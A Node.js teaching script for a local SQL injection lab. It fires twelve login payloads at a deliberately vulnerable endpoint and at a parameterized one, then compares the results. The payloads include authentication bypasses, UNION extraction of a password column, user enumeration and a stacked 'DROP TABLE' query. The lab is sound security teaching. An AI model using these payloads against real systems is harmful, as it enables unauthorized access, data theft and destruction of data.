#!/usr/bin/env node

/**
 * SQL Injection Lab - Authentication Testing Script
 * 
 * Usage: npm run test-payloads
 * 
 * This script demonstrates various SQL injection payloads
 * against vulnerable and secure endpoints.
 */

const http = require('http');

// Configuration
const BASE_URL = 'http://localhost:5000';
const ENDPOINTS = {
  vulnerable: '/api/security-lab/sql-injection/login-vulnerable',
  secure: '/api/security-lab/sql-injection/login-secure'
};

// Color codes for terminal output
const colors = {
  reset: '\x1b[0m',
  bright: '\x1b[1m',
  dim: '\x1b[2m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  cyan: '\x1b[36m',
  white: '\x1b[37m'
};

// Test payloads - organized by attack type
const TEST_PAYLOADS = [
  {
    name: 'Test 1: Valid Credentials',
    username: 'admin_demo',
    password: 'DemoPass123',
    description: 'Normal login with correct credentials'
  },
  {
    name: 'Test 2: OR-Based Condition Bypass',
    username: "admin_demo' OR '1'='1",
    password: 'anything',
    description: 'Makes WHERE clause always true'
  },
  {
    name: 'Test 3: SQL Comment Bypass (--)',
    username: "admin_demo' --",
    password: 'ignored',
    description: 'Comments out the password check'
  },
  {
    name: 'Test 4: SQL Comment Bypass (#)',
    username: "admin_demo' #",
    password: 'ignored',
    description: 'Alternative comment syntax'
  },
  {
    name: 'Test 5: Double Quote OR Bypass',
    username: 'admin_demo" OR "1"="1',
    password: 'anything',
    description: 'Same as Test 2 but with double quotes'
  },
  {
    name: 'Test 6: Always True Logic',
    username: "' OR 'x'='x",
    password: "' OR 'x'='x",
    description: 'Both fields made true (basic SQLI)'
  },
  {
    name: 'Test 7: UNION SELECT (Data Extraction)',
    username: "admin' UNION SELECT 1,2,3 --",
    password: 'anything',
    description: 'Attempts to extract data via UNION'
  },
  {
    name: 'Test 8: Information Schema Attack',
    username: "' UNION SELECT 1,password,3 FROM lab_users --",
    password: 'anything',
    description: 'Tries to extract password column'
  },
  {
    name: 'Test 9: Boolean-Based Blind SQLI',
    username: "admin_demo' AND '1'='1",
    password: 'anything',
    description: 'Conditional logic for blind injection'
  },
  {
    name: 'Test 10: User Enumeration',
    username: "' OR '1'='1' LIMIT 1,1 --",
    password: 'anything',
    description: 'Attempts to enumerate users'
  },
  {
    name: 'Test 11: Non-Admin User Check',
    username: 'user_demo',
    password: 'UserPass456',
    description: 'Test with secondary user account'
  },
  {
    name: 'Test 12: Stacked Query (Advanced)',
    username: "admin_demo'; DROP TABLE lab_users; --",
    password: 'anything',
    description: 'Dangerous - attempts multiple statements'
  }
];

/**
 * Make HTTP request to endpoint
 */
function makeRequest(endpoint, username, password) {
  return new Promise((resolve, reject) => {
    const postData = JSON.stringify({ username, password });

    const options = {
      hostname: 'localhost',
      port: 5000,
      path: endpoint,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };

    const req = http.request(options, (res) => {
      let data = '';

      res.on('data', (chunk) => {
        data += chunk;
      });

      res.on('end', () => {
        try {
          const parsed = JSON.parse(data);
          resolve({
            statusCode: res.statusCode,
            body: parsed
          });
        } catch {
          resolve({
            statusCode: res.statusCode,
            body: data
          });
        }
      });
    });

    req.on('error', reject);
    req.write(postData);
    req.end();
  });
}

/**
 * Test a single payload against both endpoints
 */
async function testPayload(payload, index) {
  console.log(`\n${colors.bright}${colors.cyan}${'='.repeat(80)}${colors.reset}`);
  console.log(`${colors.bright}${colors.yellow}[${index}] ${payload.name}${colors.reset}`);
  console.log(`${colors.dim}Description: ${payload.description}${colors.reset}`);
  console.log(`${colors.bright}${colors.cyan}${'='.repeat(80)}${colors.reset}\n`);

  console.log(`${colors.bright}Input:${colors.reset}`);
  console.log(`  ${colors.cyan}Username:${colors.reset} ${payload.username}`);
  console.log(`  ${colors.cyan}Password:${colors.reset} ${payload.password}\n`);

  // Test vulnerable endpoint
  console.log(`${colors.bright}${colors.red}[VULNERABLE ENDPOINT]${colors.reset}`);
  try {
    const vulnResponse = await makeRequest(ENDPOINTS.vulnerable, payload.username, payload.password);
    console.log(`  ${colors.cyan}Status:${colors.reset} ${vulnResponse.statusCode}`);
    
    if (vulnResponse.body.success === true) {
      console.log(`  ${colors.bright}${colors.red}Result: ✅ ACCESS GRANTED${colors.reset}`);
      if (vulnResponse.body.user) {
        console.log(`  ${colors.yellow}User:${colors.reset} ${JSON.stringify(vulnResponse.body.user)}`);
      }
    } else if (vulnResponse.statusCode === 401) {
      console.log(`  ${colors.yellow}Result: ❌ Access Denied${colors.reset}`);
    } else {
      console.log(`  ${colors.red}Result: ⚠️ Database Error${colors.reset}`);
      if (vulnResponse.body.error) {
        console.log(`  ${colors.dim}Error: ${vulnResponse.body.error}${colors.reset}`);
      }
    }

    if (vulnResponse.body.sql) {
      console.log(`  ${colors.bright}${colors.cyan}Executed SQL:${colors.reset}`);
      console.log(`    ${colors.dim}${vulnResponse.body.sql}${colors.reset}`);
    }
  } catch (error) {
    console.log(`  ${colors.red}Error: ${error.message}${colors.reset}`);
  }

  console.log();

  // Test secure endpoint
  console.log(`${colors.bright}${colors.green}[SECURE ENDPOINT]${colors.reset}`);
  try {
    const secResponse = await makeRequest(ENDPOINTS.secure, payload.username, payload.password);
    console.log(`  ${colors.cyan}Status:${colors.reset} ${secResponse.statusCode}`);
    
    if (secResponse.body.success === true) {
      console.log(`  ${colors.bright}${colors.green}Result: ✅ ACCESS GRANTED${colors.reset}`);
      if (secResponse.body.user) {
        console.log(`  ${colors.yellow}User:${colors.reset} ${JSON.stringify(secResponse.body.user)}`);
      }
    } else if (secResponse.statusCode === 401) {
      console.log(`  ${colors.bright}${colors.green}Result: ✅ Access Denied (Safe!)${colors.reset}`);
    } else {
      console.log(`  ${colors.yellow}Result: ⚠️ Error${colors.reset}`);
    }

    if (secResponse.body.sql) {
      console.log(`  ${colors.bright}${colors.cyan}Query Structure:${colors.reset}`);
      console.log(`    ${colors.dim}${secResponse.body.sql}${colors.reset}`);
    }
  } catch (error) {
    console.log(`  ${colors.red}Error: ${error.message}${colors.reset}`);
  }
}

/**
 * Main execution
 */
async function main() {
  console.clear();
  console.log(`${colors.bright}${colors.blue}`);
  console.log('  ╔═══════════════════════════════════════════════════════════════╗');
  console.log('  ║   SQL Injection Lab - Authentication Testing Script           ║');
  console.log('  ║   Learn SQL Injection by testing vulnerable vs secure code    ║');
  console.log('  ╚═══════════════════════════════════════════════════════════════╝');
  console.log(`${colors.reset}\n`);

  console.log(`${colors.dim}🔗 Backend: ${BASE_URL}`);
  console.log(`${colors.dim}📊 Payloads: ${TEST_PAYLOADS.length} tests planned\n${colors.reset}`);

  // Verify backend is running
  try {
    console.log(`${colors.yellow}⏳ Checking backend connection...${colors.reset}`);
    const testResponse = await makeRequest(ENDPOINTS.vulnerable, 'test', 'test');
    console.log(`${colors.green}✅ Backend is running!\n${colors.reset}`);
  } catch (error) {
    console.log(`${colors.red}❌ Cannot reach backend at ${BASE_URL}${colors.reset}`);
    console.log(`${colors.yellow}Make sure your backend server is running:${colors.reset}`);
    console.log(`${colors.dim}  npm start (from backend/ directory)${colors.reset}\n`);
    process.exit(1);
  }

  // Run all tests
  for (let i = 0; i < TEST_PAYLOADS.length; i++) {
    await testPayload(TEST_PAYLOADS[i], i + 1);
    
    // Add delay between requests
    if (i < TEST_PAYLOADS.length - 1) {
      await new Promise(resolve => setTimeout(resolve, 300));
    }
  }

  // Summary
  console.log(`\n${colors.bright}${colors.cyan}${'='.repeat(80)}${colors.reset}`);
  console.log(`${colors.bright}${colors.green}✅ All Tests Complete!${colors.reset}`);
  console.log(`${colors.bright}${colors.cyan}${'='.repeat(80)}${colors.reset}\n`);

  console.log(`${colors.bright}Key Observations:${colors.reset}`);
  console.log(`${colors.yellow}1.${colors.reset} ${colors.red}Vulnerable endpoint${colors.reset} shows successful bypasses with SQLI payloads`);
  console.log(`${colors.yellow}2.${colors.reset} ${colors.green}Secure endpoint${colors.reset} safely rejects all malicious payloads`);
  console.log(`${colors.yellow}3.${colors.reset} Both endpoints demonstrate the importance of parameterized queries\n`);

  console.log(`${colors.bright}Learn More:${colors.reset}`);
  console.log(`${colors.dim}  📖 See SQL_INJECTION_LAB_GUIDE.md for detailed explanations`);
  console.log(`${colors.dim}  🌐 Visit http://localhost:3000/security-lab/sql-injection for interactive testing${colors.reset}\n`);
}

// Run if executed directly
if (require.main === module) {
  main().catch(error => {
    console.error(`${colors.red}Fatal Error:${colors.reset}`, error);
    process.exit(1);
  });
}

module.exports = { testPayload, makeRequest };
